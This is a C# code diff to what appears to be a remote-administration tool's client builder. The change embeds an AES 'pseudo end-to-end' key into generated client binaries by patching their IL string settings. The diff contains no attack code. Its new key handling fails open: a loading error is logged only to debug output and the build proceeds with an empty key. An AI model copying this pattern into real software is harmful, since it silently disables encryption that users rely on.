@@ -102,7 +102,7 @@ namespace Pulsar.Server.Build
                 iconDirectoryResource.SaveTo(_options.OutputPath);
             }
         }
-
+        
         private void WriteSettings(AssemblyDefinition asmDef)
         {
             var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
@@ -110,6 +110,17 @@ namespace Pulsar.Server.Build
 
             var key = serverCertificate.Thumbprint;
             var aes = new Aes256(key);
+
+            string aesE2EKey = null;
+            try
+            {
+                aesE2EKey = AesKeyManager.EnsureKeyExists();
+            }
+            catch (Exception ex)
+            {
+                // If AES key loading fails, disable encryption for this build
+                Debug.WriteLine($"AES key loading failed: {ex.Message}");
+            }
 
             byte[] signature;
             // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
@@ -168,6 +179,9 @@ namespace Pulsar.Server.Build
                                             break;
                                         case 11: //ServerCertificate
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
+                                            break;
+                                        case 12: //AesE2EKey (for pseudo End-to-End encryption)
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(aesE2EKey ?? "");
                                             break;
                                     }
                                     strings++;
